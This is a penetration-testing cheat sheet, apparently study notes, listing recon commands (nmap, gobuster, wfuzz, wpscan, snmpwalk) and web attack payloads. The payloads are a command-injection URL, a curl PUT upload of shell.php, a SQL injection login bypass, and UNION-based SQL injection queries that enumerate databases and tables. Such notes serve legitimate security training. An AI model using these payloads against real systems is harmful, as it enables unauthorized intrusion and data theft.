### Recon
##### AutoRecon
```
autorecon -ct 2 -cs 2 -vv -o outputdir 192.168.1.100 192.168.1.1/30 localhost
autorecon x.x.x.x
````
- ct (concurrent targets)
- -o custom output directory location.
- -cs limits the number of concurent scans per target
- Auto recon will create and store the results in the /results directory.
##### Nmap
```
nmap -A -T5 x.x.x.x -p- -vv
nmap -sS x.x.x.x -p- --min-rate 10000
nmap --script=scriptname.nse x.x.x.x -vv
```
##### Nikto
```
nikto -h x.x.x.x
```
##### GoBuster
```
gobuster -u x.x.x.x
gobuster dir -u http://x.x.x.x -w /usr/share/wordlists/dirb/common.txt
gobuster -u http://x.x.x.x -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php
gobuster -s 200,204,301,302,307,403 -u x.x.x.x
```
##### Wfuzz
```
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 x.x.x.x/FUZZ
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 x.x.x.x/FUZZ
wfuzz -c -z file,/root/.ZAP/fuzzers/dirbuster/directory-list-2.3-big.txt --sc 200 http://x.x.x.x/FUZZ.php
wfuzz --hw=1 --hh=3076 -w seclist_common_wordlist.txt http://x.x.x.x/FUZZ
```
##### WpScan
```
wpscan --url http://x.x.x.x --enumerate u,p,t
```
##### SNMPWalk
```
snmpwalk -c public -v1 x.x.x.x
````
##### NetDiscover
- Netdiscover is a network address discovering tool, developed mainly for those wireless networks without dhcp server, it also works on hub/switched networks. Its based on arp packets, it will send arp requests and sniff for replys.
```
netdiscover -r x.x.x.x
```
##### Webdav
- Incorrect permissions test 
```
cadaver http://x.x.x.x
davtest http://x.x.x.x
```
##### Command Injection
- File Traverse:
```
x.x.x.x/file.php?cmd=ls
```
- Test file upload with curl
```
curl -vX options http://x.x.x.x 
```
- Upload file using curl to website with PUT option available
```
curl --upload-file shell.php --url http://x.x.x.x
```
##### Login Bypass
```
john ' or '1'='1
```
- Enter into username and password
##### Determine vulnerable columns or column that is visible
```
param=' or 1=0 union select null,null,null
param=' or 1=0 union select 1,2,3
```
- Else try
```
param=' or 1=1 union select table_name,null,null from information_schema.tables
```
- If it produces an error try table_name at other positions
- Say Column 1 and 2 are visible from the above queries
- Further Enumerate
```
param=' or 1=0 union select table_schema,null,null from information_schema.columns
```
-Display all databse names
```
param=' or 1=0 union select table_name,null,null from information_schema.columns
```
- Display all table names
```
param=' or 1=1 select table_name,null,null from information_schema.columns where table_schema='public'
```
- Display tables inside public databse

